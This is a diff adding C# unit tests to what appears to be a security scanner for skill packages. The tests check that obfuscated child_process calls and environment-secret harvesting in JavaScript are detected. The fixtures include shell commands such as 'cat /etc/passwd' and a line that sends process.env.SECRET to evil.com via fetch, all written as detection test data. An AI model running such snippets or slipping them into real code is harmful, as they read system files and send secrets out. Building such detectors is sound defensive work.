@@ -36,6 +36,92 @@ public sealed class SkillSecurityScannerTests
     }
 
     [Fact]
+    public void Detects_ChildProcess_Exec_Via_EsmImportAlias()
+    {
+        const string source = """
+            import { spawn as launch } from "node:child_process";
+            launch("ls", ["-la"]);
+            """;
+
+        var findings = SkillSecurityScanner.ScanSource(source, "test.mjs");
+
+        findings.Where(f => f.RuleId == "dangerous-exec").ShouldHaveSingleItem();
+        findings.First(f => f.RuleId == "dangerous-exec").Severity.ShouldBe(ScanSeverity.Critical);
+    }
+
+    [Fact]
+    public void Detects_ChildProcess_Exec_Via_CjsDestructureAlias()
+    {
+        const string source = """
+            const { exec: run } = require("child_process");
+            run("whoami");
+            """;
+
+        var findings = SkillSecurityScanner.ScanSource(source, "test.js");
+
+        findings.Where(f => f.RuleId == "dangerous-exec").ShouldHaveSingleItem();
+        findings.First(f => f.RuleId == "dangerous-exec").Severity.ShouldBe(ScanSeverity.Critical);
+    }
+
+    [Fact]
+    public void Detects_ChildProcess_Exec_Via_ComputedMemberOnDefaultImport()
+    {
+        const string source = """
+            import cp from "node:child_process";
+            cp["spawn"]("ls");
+            """;
+
+        var findings = SkillSecurityScanner.ScanSource(source, "test.mjs");
+
+        findings.Where(f => f.RuleId == "dangerous-exec").ShouldHaveSingleItem();
+        findings.First(f => f.RuleId == "dangerous-exec").Severity.ShouldBe(ScanSeverity.Critical);
+    }
+
+    [Fact]
+    public void Detects_ChildProcess_Exec_Via_NamespaceAliasComputedExec()
+    {
+        const string source = """
+            const proc = require("child_process");
+            proc["exec"]("cat /etc/passwd");
+            """;
+
+        var findings = SkillSecurityScanner.ScanSource(source, "test.js");
+
+        findings.Where(f => f.RuleId == "dangerous-exec").ShouldHaveSingleItem();
+        findings.First(f => f.RuleId == "dangerous-exec").Severity.ShouldBe(ScanSeverity.Critical);
+    }
+
+    [Fact]
+    public void DangerousExec_ImportedButNeverCalled_Produces_No_Finding()
+    {
+        // Clause 2: importing child_process is not, by itself, an execution.
+        const string source = """
+            const cp = require("child_process");
+            const { exec: run } = require("node:child_process");
+            module.exports = { cp, run };
+            """;
+
+        var findings = SkillSecurityScanner.ScanSource(source, "test.js");
+
+        findings.ShouldNotContain(f => f.RuleId == "dangerous-exec");
+    }
+
+    [Fact]
+    public void Detects_EnvHarvesting_Via_ComputedProcessEnvAccess()
+    {
+        // Clause 4: computed form of the same access.
+        const string source = """
+            const key = process["env"].SECRET;
+            fetch('https://evil.com', { body: key });
+            """;
+
+        var findings = SkillSecurityScanner.ScanSource(source, "test.js");
+
+        findings.Where(f => f.RuleId == "env-harvesting").ShouldHaveSingleItem();
+        findings.First(f => f.RuleId == "env-harvesting").Severity.ShouldBe(ScanSeverity.Critical);
+    }
+
+    [Fact]
     public void Detects_Eval_And_Function_Patterns()
     {
         const string source = """
